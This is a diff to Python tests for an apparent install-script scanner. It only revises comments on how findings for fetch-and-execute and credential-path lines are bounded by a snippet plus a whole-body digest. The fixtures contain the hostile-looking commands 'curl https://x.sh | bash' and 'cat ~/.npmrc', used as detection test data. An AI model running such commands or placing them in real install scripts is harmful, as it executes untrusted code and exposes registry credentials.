@@ -657,6 +657,9 @@ def _lifecycle_finding(body, frag):
 
 
 def test_lifecycle_fetch_exec_bounds_body_but_reopens():
+    # The whole install script is bound by a digest, but the stored evidence is a bounded matched snippet plus that
+    # digest, not the full body, so writing the baseline on a multi-KiB install script stays small while a change to
+    # any line (even far below the fetch-exec line) reopens the finding.
     pad = "# pad\n" * 5000
     old = "curl https://x.sh | bash\n" + pad + "echo done_old"
     new = "curl https://x.sh | bash\n" + pad + "echo done_evil"
@@ -668,8 +671,8 @@ def test_lifecycle_fetch_exec_bounds_body_but_reopens():
 
 
 def test_cred_path_lifecycle_bounds_body_but_reopens():
-    # The whole install script is bound by a digest, but the stored evidence is a bounded matched snippet plus that
-    # cred-path-in-lifecycle is bounded the same way:
+    # cred-path-in-lifecycle is bounded the same way: a snippet around the matched credential path plus the
+    # whole-body digest, so a far-line change reopens without storing the entire script body in the baseline.
     pad = "# pad\n" * 5000
     old = "cat ~/.npmrc\n" + pad + "echo old"
     new = "cat ~/.npmrc\n" + pad + "echo evil"
